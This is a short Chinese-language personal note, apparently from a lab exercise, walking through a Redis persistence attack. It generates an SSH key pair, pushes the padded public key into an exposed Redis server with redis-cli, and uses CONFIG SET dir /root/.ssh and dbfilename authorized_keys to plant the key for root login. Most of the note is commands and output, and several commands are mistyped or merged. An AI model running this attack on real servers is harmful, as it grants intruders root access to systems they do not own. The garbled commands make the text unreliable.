# 利用持久化，利用"公私钥"认证获取 root 权限

![image-20240530153905972](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530153905972.png)

```bash
在攻击机(redis 客户端)
中生成ssh公钥和私钥，
密码设置为空:
	ssh-keygen -t rsa
cd /root/.ssh
ls

进入/root/.ssh 目录:将生成的公钥保存到 1.txt:
	(echo -e"\n\n";cat id_rsa.pub; echo -e "\n\n")
	cd /root/.ssh
	(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n")> 1.txt
```

```bash
连接目标服务器上的 Redis 服务，将保存的公钥1.txt写入Redis(使用redis-cli -hip 命令连
接靶机，将文件写入):
	cat1.txt | redis-cli -h ip -x set crack cat 1.txt | /路径/redis-cli -h 192.168.137.11 -x set crack

登陆靶机，设置如下:
[root@localhost src]# ./redis-cli -h 192.168.137.11

192.168.137.11:6379> config set dir /root/.ssh
(error) ERR Changing directory: No such file or directory

192.168.137.11:6379> config set dir /root/.sshOK
这一步如果报错，说没有.ssh 文件夹，则在靶机上执行sh-keygen-trsa生成下密钥和.ssh文件

CONFlG SET dbfilename authorized keys
ok
```

